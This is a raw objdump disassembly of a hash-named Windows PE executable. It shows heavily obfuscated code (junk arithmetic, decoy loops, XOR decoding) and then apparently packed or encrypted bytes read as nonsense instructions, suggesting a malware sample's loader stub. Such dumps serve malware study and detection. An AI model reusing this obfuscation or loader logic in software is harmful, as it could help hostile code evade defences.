
18ce17d0db74a03f6e94143542914524b55d44584d905a6bd39da70a7dfb828e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    al,0x37
  401006:	cmp    DWORD PTR [ebp+0x0],ecx
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],dh
  40100d:	adc    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ecx],al
  401011:	add    BYTE PTR [eax],al
  401013:	add    BYTE PTR [ecx],al
  401015:	add    BYTE PTR [eax],al
  401017:	add    BYTE PTR [ecx],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],ch
  40101d:	adc    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax+edx*1],ch
  401022:	add    BYTE PTR [eax],al
  401024:	xor    BYTE PTR [eax],dl
  401026:	add    BYTE PTR [eax],al
  401028:	xor    BYTE PTR [eax+eax*1+0x103e00],al
  40102f:	add    BYTE PTR [eax],al
  401031:	add    BYTE PTR [edi+0x6f],dl
  401034:	jb     0x40109a
  401036:	push   edi
  401037:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  40103e:	aas    
  40103f:	inc    ebx
  401040:	ins    BYTE PTR es:[edi],dx
  401041:	outs   dx,DWORD PTR ds:[esi]
  401042:	jae    0x4010a9
  401044:	push   edi
  401045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  40104c:	popa   
  40104d:	je     0x4010b8
  40104f:	outs   dx,DWORD PTR ds:[esi]
  401050:	outs   dx,BYTE PTR ds:[esi]
  401051:	inc    ebx
  401052:	ins    BYTE PTR es:[edi],dx
  401053:	outs   dx,DWORD PTR ds:[esi]
  401054:	jae    0x4010bb
  401056:	push   edi
  401057:	imul   edx,DWORD PTR [ebp-0x75],0xa4ec81ec
  40105e:	add    BYTE PTR [eax],al
  401060:	add    BYTE PTR [ebx+0x3d11084d],cl
  401066:	add    BYTE PTR [eax-0x7a47ffbe],ah
  40106c:	mov    al,BYTE PTR [eax]
  40106e:	add    BYTE PTR [esi+0x33],ah
  401071:	inc    ecx
  401072:	and    BYTE PTR [ebx],ch
  401074:	or     eax,0x42b00c
  401079:	mov    ecx,0x3b4b
  40107e:	xor    DWORD PTR ds:0x429018,0x42b01c
  401088:	add    ax,cx
  40108b:	adc    ecx,DWORD PTR ds:0x42c010
  401091:	movzx  eax,ax
  401094:	mov    ecx,DWORD PTR ds:0x423df2
  40109a:	mov    ecx,DWORD PTR [ecx]
  40109c:	sub    DWORD PTR ds:0x42d014,ecx
  4010a2:	mov    DWORD PTR [ebp-0x18],eax
  4010a5:	and    DWORD PTR ds:0x42c008,ebx
  4010ab:	mov    BYTE PTR [ebp-0x1],0x61
  4010af:	sbb    ecx,0x3fcf
  4010b5:	lea    eax,[ebp-0x1]
  4010b8:	xor    ecx,ecx
  4010ba:	xor    ecx,DWORD PTR ds:0x429024
  4010c0:	adc    ecx,DWORD PTR ds:0x42b004
  4010c6:	mov    DWORD PTR ds:0x429024,ecx
  4010cc:	mov    DWORD PTR [ebp-0x10],eax
  4010cf:	mov    ecx,DWORD PTR ds:0x42d01c
  4010d5:	sub    DWORD PTR ds:0x42900c,ecx
  4010db:	mov    al,BYTE PTR [ebp-0x1]
  4010de:	mov    ecx,DWORD PTR [ebp-0x10]
  4010e1:	xor    DWORD PTR ds:0x42b004,0x42900c
  4010eb:	xor    al,0x6f
  4010ed:	sub    al,0xd
  4010ef:	adc    DWORD PTR ds:0x42d008,0x362f
  4010f9:	mov    BYTE PTR [ecx],al
  4010fb:	mov    DWORD PTR ds:0x429020,0x1b
  401105:	cmp    DWORD PTR ds:0x429020,0x0
  40110c:	je     0x40113f
  401112:	cmp    DWORD PTR ds:0x429020,0x24
  401119:	jne    0x40112d
  40111f:	push   DWORD PTR [ebp-0x24]
  401122:	push   0x4244de
  401127:	call   DWORD PTR ds:0x425010
  40112d:	mov    ecx,DWORD PTR ds:0x429020
  401133:	dec    ecx
  401134:	mov    DWORD PTR ds:0x429020,ecx
  40113a:	jmp    0x401105
  40113f:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  401146:	push   ebx
  401147:	sub    ecx,eax
  401149:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  401150:	and    DWORD PTR ds:0x42901c,ebx
  401156:	mov    ecx,DWORD PTR [ebp-0x14]
  401159:	push   esi
  40115a:	mov    eax,0x7510893
  40115f:	xor    ecx,eax
  401161:	or     esi,DWORD PTR ds:0x42900c
  401167:	mov    esi,0x3272db
  40116c:	and    DWORD PTR ds:0x429024,0x1a45
  401176:	push   edi
  401177:	sub    DWORD PTR ds:0x42c018,0x2ac6
  401181:	add    ecx,esi
  401183:	mov    DWORD PTR ds:0x42c008,0x57e6
  40118d:	jmp    0x4011bb
  401192:	mov    DWORD PTR ds:0x42a014,0x4932
  40119c:	mov    dl,BYTE PTR [ebp-0x1]
  40119f:	mov    DWORD PTR ds:0x42d014,0x6fce
  4011a9:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  4011b0:	mov    DWORD PTR ds:0x42c010,0x5862
  4011ba:	inc    ecx
  4011bb:	mov    DWORD PTR ds:0x42a018,0x6e07
  4011c5:	cmp    ecx,0x40
  4011c8:	jb     0x401192
  4011ce:	sbb    DWORD PTR ds:0x42a010,0x6c84
  4011d8:	mov    edx,DWORD PTR [ebp-0x14]
  4011db:	add    DWORD PTR ds:0x42b004,0x42900c
  4011e5:	xor    edx,eax
  4011e7:	sub    DWORD PTR ds:0x42c018,0x6b15
  4011f1:	add    edx,esi
  4011f3:	jmp    0x40132b
  4011f8:	add    DWORD PTR ds:0x42b000,ecx
  4011fe:	mov    edi,DWORD PTR [ebp+0x8]
  401201:	mov    DWORD PTR ds:0x42b010,0x1a
  40120b:	cmp    DWORD PTR ds:0x42b010,0x0
  401212:	je     0x40126b
  401218:	cmp    DWORD PTR ds:0x42b010,0x3
  40121f:	jne    0x401233
  401225:	push   0x3d21
  40122a:	push   DWORD PTR [ebp-0x10]
  40122d:	call   DWORD PTR ds:0x425018
  401233:	cmp    DWORD PTR ds:0x42b010,0x4
  40123a:	jne    0x40124f
  401240:	xor    ecx,ecx
  401242:	or     ecx,DWORD PTR ds:0x42b010
  401248:	dec    ecx
  401249:	mov    DWORD PTR ds:0x42b010,ecx
  40124f:	mov    ecx,DWORD PTR ds:0x42b010
  401255:	dec    ecx
  401256:	mov    DWORD PTR ds:0x42b010,ecx
  40125c:	jmp    0x40120b
  401261:	or     DWORD PTR ds:0x429004,0x4238
  40126b:	mov    ecx,0x8a85
  401270:	sbb    DWORD PTR ds:0x42a014,0x4641
  40127a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40127f:	xor    DWORD PTR ds:0x42901c,edi
  401285:	mov    edi,0x3b4b
  40128a:	add    cx,di
  40128d:	and    DWORD PTR ds:0x42a01c,0x60c1
  401297:	movzx  ecx,cx
  40129a:	mov    DWORD PTR [ebp-0x10],ecx
  40129d:	and    DWORD PTR ds:0x42c014,0x0
  4012a7:	jmp    0x4012b9
  4012ac:	mov    ecx,DWORD PTR ds:0x42c014
  4012b2:	inc    ecx
  4012b3:	mov    DWORD PTR ds:0x42c014,ecx
  4012b9:	cmp    DWORD PTR ds:0x42c014,0x14
  4012c0:	jae    0x4012ec
  4012c6:	cmp    DWORD PTR ds:0x42c014,0x19
  4012cd:	jne    0x4012e5
  4012d3:	push   0x42d008
  4012d8:	push   0x0
  4012da:	push   0x424421
  4012df:	call   DWORD PTR ds:0x42501c
  4012e5:	jmp    0x4012ac
  4012ea:	neg    ecx
  4012ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4012ef:	mov    DWORD PTR ds:0x42a000,0x57bf
  4012f9:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012fd:	xor    ecx,0x8a85
  401303:	add    DWORD PTR ds:0x42b00c,0x42c004
  40130d:	add    ecx,edi
  40130f:	movzx  edi,BYTE PTR ds:0x42c018
  401316:	mov    edi,DWORD PTR [ebp-0x10]
  401319:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  401320:	mov    DWORD PTR ds:0x429024,0x374e
  40132a:	inc    edx
  40132b:	mov    ecx,0x6cf1
  401330:	mov    ecx,DWORD PTR [ebp-0x18]
  401333:	cmp    edx,ecx
  401335:	jne    0x4011f8
  40133b:	mov    ecx,DWORD PTR [ebp-0x14]
  40133e:	and    DWORD PTR ds:0x42d014,0x0
  401348:	mov    edx,DWORD PTR ds:0x42d014
  40134e:	inc    edx
  40134f:	mov    DWORD PTR ds:0x42d014,edx
  401355:	cmp    DWORD PTR ds:0x42d014,0x1e
  40135c:	jne    0x401370
  401362:	push   0x42a010
  401367:	push   DWORD PTR [ebp-0xc]
  40136a:	call   DWORD PTR ds:0x425020
  401370:	cmp    DWORD PTR ds:0x42d014,0x1a
  401377:	jb     0x401348
  40137d:	mov    edx,DWORD PTR [ebp+0x10]
  401380:	add    DWORD PTR ds:0x429018,0x42d01c
  40138a:	xor    ecx,eax
  40138c:	add    ecx,esi
  40138e:	mov    DWORD PTR [edx],ecx
  401390:	xor    DWORD PTR ds:0x429020,0x151c
  40139a:	mov    ecx,DWORD PTR [ebp-0x14]
  40139d:	sbb    DWORD PTR ds:0x42a004,0x76e2
  4013a7:	xor    ecx,eax
  4013a9:	add    ecx,esi
  4013ab:	mov    DWORD PTR [ebp-0x20],ecx
  4013ae:	mov    DWORD PTR ds:0x42c00c,0x69f9
  4013b8:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  4013bf:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013c6:	mov    DWORD PTR ds:0x42c00c,ecx
  4013cc:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	mov    DWORD PTR ds:0x429004,0x7870
  4013e0:	mov    DWORD PTR [ebp+0x8],ecx
  4013e3:	jmp    0x4015f6
  4013e8:	xor    DWORD PTR ds:0x42a014,0x45a5
  4013f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4013f5:	and    DWORD PTR ds:0x42b008,0x0
  4013ff:	mov    edx,DWORD PTR ds:0x42b008
  401405:	inc    edx
  401406:	mov    DWORD PTR ds:0x42b008,edx
  40140c:	cmp    DWORD PTR ds:0x42b008,0x29
  401413:	jne    0x401424
  401419:	push   0x3311
  40141e:	call   DWORD PTR ds:0x425028
  401424:	cmp    DWORD PTR ds:0x42b008,0x1f
  40142b:	jb     0x4013ff
  401431:	adc    DWORD PTR ds:0x42a008,0x7a1a
  40143b:	mov    edx,DWORD PTR [ebp-0x8]
  40143e:	neg    DWORD PTR ds:0x42b00c
  401444:	xor    ecx,eax
  401446:	xor    DWORD PTR ds:0x429018,0x42b01c
  401450:	xor    edx,eax
  401452:	or     DWORD PTR ds:0x429020,0x5996
  40145c:	sub    ecx,edx
  40145e:	movzx  edx,BYTE PTR ds:0x42a014
  401465:	adc    DWORD PTR ds:0x429028,edx
  40146b:	sub    ecx,esi
  40146d:	xor    DWORD PTR ds:0x429028,0xa7c
  401477:	xor    ecx,eax
  401479:	not    edx
  40147b:	mov    DWORD PTR [ebp+0x8],ecx
  40147e:	add    DWORD PTR ds:0x42a01c,0x480
  401488:	mov    ecx,DWORD PTR [ebp+0x8]
  40148b:	mov    edx,DWORD PTR [ebp-0x64]
  40148e:	or     DWORD PTR ds:0x429028,0x2c95
  401498:	lea    ecx,[edx+ecx*1+0x5708f5]
  40149f:	and    edx,0x1ea1
  4014a5:	mov    DWORD PTR [ebp-0x64],ecx
  4014a8:	and    DWORD PTR ds:0x42c000,0x0
  4014b2:	jmp    0x4014c4
  4014b7:	mov    ecx,DWORD PTR ds:0x42c000
  4014bd:	inc    ecx
  4014be:	mov    DWORD PTR ds:0x42c000,ecx
  4014c4:	cmp    DWORD PTR ds:0x42c000,0x1f
  4014cb:	jae    0x401506
  4014d1:	cmp    DWORD PTR ds:0x42c000,0x2a
  4014d8:	jne    0x401501
  4014de:	push   DWORD PTR [ebp-0x1c]
  4014e1:	push   DWORD PTR [ebp-0x10]
  4014e4:	push   0x42a004
  4014e9:	push   0x8921
  4014ee:	push   DWORD PTR [ebp-0x24]
  4014f1:	push   0x8115
  4014f6:	push   0x4d38
  4014fb:	call   DWORD PTR ds:0x42502c
  401501:	jmp    0x4014b7
  401506:	mov    ecx,DWORD PTR [ebp+0x8]
  401509:	mov    edx,DWORD PTR [ebp-0x60]
  40150c:	sub    DWORD PTR ds:0x42a000,0x42a01c
  401516:	lea    ecx,[edx+ecx*1+0x5708f5]
  40151d:	neg    edx
  40151f:	mov    DWORD PTR [ebp-0x60],ecx
  401522:	adc    DWORD PTR ds:0x42d01c,edx
  401528:	mov    ecx,DWORD PTR [ebp+0x8]
  40152b:	add    DWORD PTR ds:0x429008,0x3e29
  401535:	mov    edx,DWORD PTR [ebp-0x5c]
  401538:	add    DWORD PTR ds:0x429028,0x42b010
  401542:	lea    ecx,[edx+ecx*1+0x5708f4]
  401549:	and    DWORD PTR ds:0x42d008,0x0
  401553:	mov    edx,DWORD PTR ds:0x42d008
  401559:	inc    edx
  40155a:	mov    DWORD PTR ds:0x42d008,edx
  401560:	cmp    DWORD PTR ds:0x42d008,0x8
  401567:	jne    0x401576
  40156d:	push   DWORD PTR [ebp-0x20]
  401570:	call   DWORD PTR ds:0x425030
  401576:	cmp    DWORD PTR ds:0x42d008,0x7
  40157d:	jne    0x401592
  401583:	xor    edx,edx
  401585:	or     edx,DWORD PTR ds:0x42d008
  40158b:	inc    edx
  40158c:	mov    DWORD PTR ds:0x42d008,edx
  401592:	cmp    DWORD PTR ds:0x42d008,0x17
  401599:	jb     0x401553
  40159f:	xor    edx,DWORD PTR ds:0x42d00c
  4015a5:	mov    DWORD PTR [ebp-0x5c],ecx
  4015a8:	sbb    ecx,edx
  4015aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4015ad:	xor    DWORD PTR ds:0x42b01c,0x42c004
  4015b7:	mov    edx,DWORD PTR [ebp-0x58]
  4015ba:	lea    ecx,[edx+ecx*1+0x5708fb]
  4015c1:	xor    edx,0x2bb1
  4015c7:	mov    DWORD PTR [ebp-0x58],ecx
  4015ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4015cd:	mov    edx,DWORD PTR [ebp-0x54]
  4015d0:	adc    DWORD PTR ds:0x429024,0x7906
  4015da:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015e1:	not    edx
  4015e3:	mov    DWORD PTR [ebp-0x54],ecx
  4015e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e9:	mov    edx,DWORD PTR [ebp-0x50]
  4015ec:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015f3:	mov    DWORD PTR [ebp-0x50],ecx
  4015f6:	dec    ecx
  4015f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4015fa:	xor    ecx,eax
  4015fc:	or     DWORD PTR ds:0x42d000,0x34f3
  401606:	add    ecx,esi
  401608:	mov    DWORD PTR ds:0x42c01c,0x3161
  401612:	jne    0x4013e8
  401618:	mov    DWORD PTR ds:0x429018,0x1b23
  401622:	jmp    0x405fe7
  401627:	mov    ecx,DWORD PTR [ebp-0x1c]
  40162a:	and    DWORD PTR ds:0x42c000,0x0
  401634:	jmp    0x401648
  401639:	xor    edx,edx
  40163b:	xor    edx,DWORD PTR ds:0x42c000
  401641:	inc    edx
  401642:	mov    DWORD PTR ds:0x42c000,edx
  401648:	cmp    DWORD PTR ds:0x42c000,0x15
  40164f:	jae    0x4016e1
  401655:	cmp    DWORD PTR ds:0x42c000,0xa
  40165c:	jne    0x40166e
  401662:	push   DWORD PTR [ebp-0x14]
  401665:	push   DWORD PTR [ebp-0x14]
  401668:	call   DWORD PTR ds:0x425034
  40166e:	cmp    DWORD PTR ds:0x42c000,0x9
  401675:	jne    0x40168a
  40167b:	xor    edx,edx
  40167d:	add    edx,DWORD PTR ds:0x42c000
  401683:	inc    edx
  401684:	mov    DWORD PTR ds:0x42c000,edx
  40168a:	jmp    0x401639
  40168f:	and    DWORD PTR ds:0x42c000,0x0
  401699:	mov    edx,DWORD PTR ds:0x42c000
  40169f:	inc    edx
  4016a0:	mov    DWORD PTR ds:0x42c000,edx
  4016a6:	cmp    DWORD PTR ds:0x42c000,0x1e
  4016ad:	jne    0x4016c6
  4016b3:	push   0x424381
  4016b8:	push   0x42448a
  4016bd:	push   DWORD PTR [ebp-0x18]
  4016c0:	call   DWORD PTR ds:0x42503c
  4016c6:	cmp    DWORD PTR ds:0x42c000,0x12
  4016cd:	jb     0x401699
  4016d3:	xor    edx,edx
  4016d5:	xor    edx,DWORD PTR ds:0x429010
  4016db:	sub    DWORD PTR ds:0x42a01c,edx
  4016e1:	mov    edx,DWORD PTR [ebp-0x8]
  4016e4:	xor    ecx,eax
  4016e6:	xor    edx,eax
  4016e8:	add    DWORD PTR ds:0x429014,0x42d010
  4016f2:	sub    ecx,edx
  4016f4:	mov    DWORD PTR ds:0x42d00c,0x49b3
  4016fe:	sub    ecx,esi
  401700:	xor    ecx,eax
  401702:	mov    DWORD PTR ds:0x42901c,0x3f4e
  40170c:	mov    DWORD PTR [ebp-0x1c],ecx
  40170f:	mov    ecx,DWORD PTR ds:0x42b014
  401715:	mov    ecx,DWORD PTR [ebp-0xc]
  401718:	mov    DWORD PTR [ebp+0x8],ecx
  40171b:	jmp    0x40174d
  401720:	mov    ecx,DWORD PTR [ebp+0x8]
  401723:	mov    edx,DWORD PTR [ebp-0x8]
  401726:	xor    ecx,eax
  401728:	xor    edx,eax
  40172a:	sub    ecx,edx
  40172c:	sub    ecx,esi
  40172e:	xor    ecx,eax
  401730:	mov    DWORD PTR [ebp+0x8],ecx
  401733:	mov    ecx,DWORD PTR [ebp+0x8]
  401736:	mov    edx,DWORD PTR [ebp+0x8]
  401739:	imul   edx,edx,0x5708f5
  40173f:	xor    ecx,eax
  401741:	add    ecx,esi
  401743:	lea    ecx,[ebp+ecx*4-0x64]
  401747:	mov    edi,DWORD PTR [ecx]
  401749:	add    edx,edi
  40174b:	mov    DWORD PTR [ecx],edx
  40174d:	mov    ecx,DWORD PTR [ebp+0x8]
  401750:	xor    ecx,eax
  401752:	add    ecx,esi
  401754:	jne    0x401720
  40175a:	mov    ecx,DWORD PTR [ebp-0x20]
  40175d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401764:	mov    dl,BYTE PTR [ebp-0x1]
  401767:	cmp    cl,dl
  401769:	je     0x405f48
  40176f:	mov    ecx,DWORD PTR [ebp-0x20]
  401772:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401779:	mov    edx,DWORD PTR [ebp+0xc]
  40177c:	cmp    cl,BYTE PTR [edx]
  40177e:	jne    0x405ff9
  401784:	mov    ecx,DWORD PTR [ebp-0x14]
  401787:	mov    edx,DWORD PTR [ebp+0xc]
  40178a:	movsx  edx,BYTE PTR [edx]
  40178d:	xor    ecx,eax
  40178f:	add    ecx,esi
  401791:	jmp    0x403b14
  401796:	add    al,0xcb
  401798:	xchg   edi,eax
  401799:	dec    esp
  40179a:	xchg   edi,eax
  40179b:	in     al,0x63
  40179d:	sbb    DWORD PTR [edx],0xffffff98
  4017a0:	adc    al,0xee
  4017a2:	dec    ecx
  4017a3:	mov    cl,0x12
  4017a5:	sbb    DWORD PTR [edx+0x62],esp
  4017a8:	bound  esp,QWORD PTR [edx+0x1c]
  4017ab:	pop    edi
  4017ac:	bound  esp,QWORD PTR [edx+0x9]
  4017af:	xor    BYTE PTR [edi],al
  4017b1:	cmp    eax,0xf033905
  4017b6:	jns    0x4017de
  4017b8:	jne    0x401830
  4017ba:	lds    edi,FWORD PTR [edx+esi*2+0x72]
  4017be:	jno    0x4017ea
  4017c0:	fld    st(0)
  4017c2:	std    
  4017c3:	dec    esp
  4017c4:	push   esp
  4017c5:	jae    0x401844
  4017c7:	inc    ebx
  4017c8:	mov    WORD PTR [ecx+esi*2+0x45],?
  4017cc:	scas   eax,DWORD PTR es:[edi]
  4017cd:	inc    ecx
  4017ce:	push   edx
  4017cf:	cmp    al,0x90
  4017d1:	loop   0x40176a
  4017d3:	inc    di
  4017d5:	push   ecx
  4017d6:	jg     0x4017ff
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	mov    dh,0x7f
  4017db:	mov    esp,0xff3023ba
  4017e0:	jbe    0x4017a2
  4017e2:	loop   0x40182f
  4017e4:	jg     0x401804
  4017e6:	icebp  
  4017e7:	and    eax,0x97f1a2d1
  4017ec:	or     ebx,esi
  4017ee:	xchg   ebx,eax
  4017ef:	xor    eax,0x92b345ef
  4017f4:	fsub   st,st(7)
  4017f6:	jno    0x4017b9
  4017f8:	sbb    al,cl
  4017fa:	out    dx,al
  4017fb:	loop   0x401833
  4017fd:	add    al,0x54
  4017ff:	adc    BYTE PTR [esi],dh
  401801:	jae    0x401877
  401803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401804:	(bad)  
  401805:	or     ebx,DWORD PTR [ebp+0x19]
  401808:	mov    dh,0xff
  40180a:	cmc    
  40180b:	push   ebp
  40180c:	xor    ebp,DWORD PTR [eax+0x2a]
  40180f:	aam    0x43
  401811:	in     eax,0x2
  401813:	loop   0x401879
  401815:	mov    ebp,0x5f84c17b
  40181a:	xchg   ebx,eax
  40181b:	mov    ebp,0x2d9a0817
  401820:	jmp    0x4017c0
  401822:	and    BYTE PTR [edx+0x6b],ch
  401825:	adc    eax,edx
  401827:	xor    DWORD PTR [edx-0x6f],ecx
  40182a:	sub    BYTE PTR [ebx],ch
  40182c:	dec    eax
  40182d:	sti    
  40182e:	scas   eax,DWORD PTR es:[edi]
  40182f:	xchg   edx,eax
  401830:	xor    eax,0xd0a7ac95
  401835:	xchg   esp,eax
  401836:	dec    ebp
  401837:	clc    
  401838:	pop    ecx
  401839:	dec    edx
  40183a:	push   eax
  40183b:	adc    BYTE PTR [esi],bh
  40183d:	jmp    0x401865
  40183f:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  401845:	fcomp  QWORD PTR [eax]
  401847:	inc    esi
  401848:	loope  0x401894
  40184a:	inc    esi
  40184b:	mov    ecx,0xe4bf74e5
  401850:	pop    edx
  401851:	add    ebx,edi
  401853:	sub    eax,0x91f506d2
  401858:	outs   dx,BYTE PTR ds:[esi]
  401859:	dec    esi
  40185a:	and    dl,BYTE PTR [edx+0x30]
  40185d:	mov    esp,ds
  40185f:	adc    BYTE PTR [esi-0xc],cl
  401862:	lds    ebx,FWORD PTR ds:0xaf84a805
  401868:	test   dh,0x5b
  40186b:	frstor [edx-0x72]
  40186e:	shl    BYTE PTR [edi-0x2d1fe0a4],cl
  401874:	sub    al,0xfc
  401876:	mov    ah,0x59
  401878:	mov    dl,BYTE PTR [esi]
  40187a:	sub    eax,0x5a26e94c
  40187f:	ficom  WORD PTR [ebx-0x33]
  401882:	mov    ah,0xba
  401884:	adc    edi,0xffffffe4
  401887:	mov    bh,0x13
  401889:	sbb    DWORD PTR [ebx],esp
  40188b:	ins    DWORD PTR es:[edi],dx
  40188c:	add    eax,DWORD PTR [ebp-0x5]
  40188f:	mov    cl,0xa0
  401891:	outs   dx,DWORD PTR ds:[esi]
  401892:	imul   edi,edx,0x60
  401895:	or     bh,BYTE PTR [edi+0x7bc1160e]
  40189b:	mov    al,0x6
  40189d:	stos   DWORD PTR es:[edi],eax
  40189e:	inc    ebx
  40189f:	retf   0x7d18
  4018a2:	dec    ebp
  4018a3:	push   eax
  4018a4:	sub    al,0x2b
  4018a6:	jbe    0x4018e8
  4018a8:	ss dec eax
  4018aa:	sbb    bh,BYTE PTR [ebp+0x6e]
  4018ad:	mov    dh,0xc1
  4018af:	sti    
  4018b0:	mov    cs,WORD PTR [ebx-0x23728939]
  4018b6:	add    esp,DWORD PTR [edi]
  4018b8:	cmp    bl,bh
  4018ba:	in     eax,0x51
  4018bc:	and    eax,DWORD PTR [esi-0x2bd27686]
  4018c2:	js     0x40189c
  4018c4:	inc    ebx
  4018c5:	pusha  
  4018c6:	repnz aaa 
  4018c8:	stc    
  4018c9:	jns    0x4018ae
  4018cb:	pop    esi
  4018cc:	fnstsw WORD PTR [esp+esi*1+0x14]
  4018d0:	shl    BYTE PTR [esi],cl
  4018d2:	pop    eax
  4018d3:	jne    0x401938
  4018d5:	mov    eax,0x161b195
  4018da:	xor    al,0x32
  4018dc:	clc    
  4018dd:	enter  0x7122,0xb
  4018e1:	dec    esi
  4018e2:	cmp    DWORD PTR [ecx+edi*8-0x7c],ebx
  4018e6:	repz push ebx
  4018e8:	loop   0x4018d8
  4018ea:	cmp    BYTE PTR [ecx-0x62],bl
  4018ed:	mov    eax,ds:0x89ced410
  4018f2:	and    dh,ch
  4018f4:	jmp    0x401930
  4018f6:	repz xor ah,BYTE PTR [esi]
  4018f9:	(bad)  
  4018fa:	cmc    
  4018fb:	aam    0x99
  4018fd:	xor    esp,eax
  4018ff:	(bad)  
  401900:	repz addr16 add eax,0xf791cb0
  401907:	adc    cl,ch
  401909:	test   BYTE PTR ds:0xd7bfd6a5,bh
  40190f:	cwde   
  401910:	in     al,0xb3
  401912:	push   ebx
  401913:	mov    BYTE PTR [edx-0x26],bh
  401916:	popa   
  401917:	or     DWORD PTR [edi-0x796085b8],esi
  40191d:	scas   eax,DWORD PTR es:[edi]
  40191e:	lock sbb al,0x3a
  401921:	ret    0x5b21
  401924:	ret    
  401925:	cmp    esp,esi
  401927:	lods   eax,DWORD PTR ds:[esi]
  401928:	les    ecx,FWORD PTR [edi-0xbcd7154]
  40192e:	pop    ebp
  40192f:	sub    DWORD PTR [eax],0xbda6583b
  401935:	aam    0x8f
  401937:	sbb    eax,DWORD PTR [esi+edi*4-0x53]
  40193b:	mov    dh,dl
  40193d:	jg     0x40192c
  40193f:	inc    ebp
  401940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401941:	mov    al,ds:0x575fc25b
  401946:	icebp  
  401947:	inc    ebx
  401948:	imul   ebx,DWORD PTR [esi+0x59],0x7
  40194c:	adc    ebx,ebx
  40194e:	adc    ecx,DWORD PTR [eax-0x636d574]
  401954:	jmp    0x582c:0xac7795e0
  40195b:	inc    ecx
  40195c:	xor    al,0x9a
  40195e:	cmp    al,0xf1
  401960:	add    DWORD PTR [ebx-0x46ea9955],0xffffff96
  401967:	(bad)  
  401968:	sar    DWORD PTR [ecx-0x3179660],1
  40196e:	and    BYTE PTR [eax-0x6a],ah
  401971:	fild   QWORD PTR [ebx+0x66]
  401974:	outs   dx,BYTE PTR ds:[esi]
  401975:	xchg   ecx,eax
  401976:	sub    eax,0x8931abc2
  40197b:	mov    ecx,0xb6dee891
  401980:	lock jg 0x4019aa
  401983:	or     eax,0xa9e95ed3
  401988:	mov    DWORD PTR [esi-0x730c4256],eax
  40198e:	xor    BYTE PTR [edi+0x60680b85],dl
  401994:	std    
  401995:	clc    
  401996:	ins    DWORD PTR es:[edi],dx
  401997:	mov    al,ds:0xa8856879
  40199c:	(bad)  
  40199d:	jb     0x40197d
  40199f:	outs   dx,BYTE PTR ds:[esi]
  4019a0:	lods   eax,DWORD PTR ds:[esi]
  4019a1:	add    BYTE PTR [edi-0x18468536],bh
  4019a7:	(bad)
  4019aa:	popa   
  4019ab:	mov    ds:0x287a8f43,al
  4019b0:	ficomp DWORD PTR [edi-0x45f36b44]
  4019b6:	pop    esi
  4019b7:	jo     0x401a33
  4019b9:	push   0xffffff89
  4019bb:	xor    al,0x31
  4019bd:	jg     0x40198d
  4019bf:	clc    
  4019c0:	sbb    edi,esi
  4019c2:	jg     0x401a09
  4019c4:	adc    dh,dl
  4019c6:	pushf  
  4019c7:	mov    esi,0x87675c40
  4019cc:	cwde   
  4019cd:	retf   
  4019ce:	aam    0xe2
  4019d0:	inc    ebx
  4019d1:	aas    
  4019d2:	adc    esi,0x42cb5719
  4019d8:	neg    DWORD PTR [ebp+0x3e]
  4019db:	mov    cl,0x97
  4019dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019de:	inc    eax
  4019df:	mov    cl,0x4c
  4019e1:	xor    bl,BYTE PTR [edx]
  4019e3:	cli    
  4019e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019e5:	popf   
  4019e6:	ficom  DWORD PTR [eax-0x6ed6d7f3]
  4019ec:	mov    eax,ds:0x16c556d5
  4019f1:	(bad)  
  4019f2:	imul   edi,DWORD PTR ds:0x8c51d73e,0x4b184f57
  4019fc:	enter  0xef84,0x6d
  401a00:	cmp    edx,ebx
  401a02:	outs   dx,DWORD PTR ds:[esi]
  401a03:	test   BYTE PTR [esi-0x6a8c0225],ch
  401a09:	cmp    al,0xd5
  401a0b:	stos   DWORD PTR es:[edi],eax
  401a0c:	out    0xff,eax
  401a0e:	mov    bh,0x27
  401a10:	les    esp,FWORD PTR [ecx]
  401a12:	repz pop edx
  401a14:	mov    ecx,0x8a4595ac
  401a19:	hlt    
  401a1a:	pmuludq mm6,mm3
  401a1d:	cmp    eax,0xe0c8b257
  401a22:	retf   0xd4bc
  401a25:	cmc    
  401a26:	bound  edx,QWORD PTR [edi]
  401a28:	cmp    bh,al
  401a2a:	shl    BYTE PTR ds:0x4384dca,1
  401a30:	add    eax,0x2724ea14
  401a35:	push   0xd4283810
  401a3a:	aas    
  401a3b:	xlat   BYTE PTR ds:[ebx]
  401a3c:	xchg   esp,eax
  401a3d:	push   ebp
  401a3e:	xchg   BYTE PTR [esi+0x79c1d577],bh
  401a44:	cmpxchg DWORD PTR [ecx],ebp
  401a47:	sbb    ah,bl
  401a49:	mov    edx,0xbe29e360
  401a4e:	dec    esi
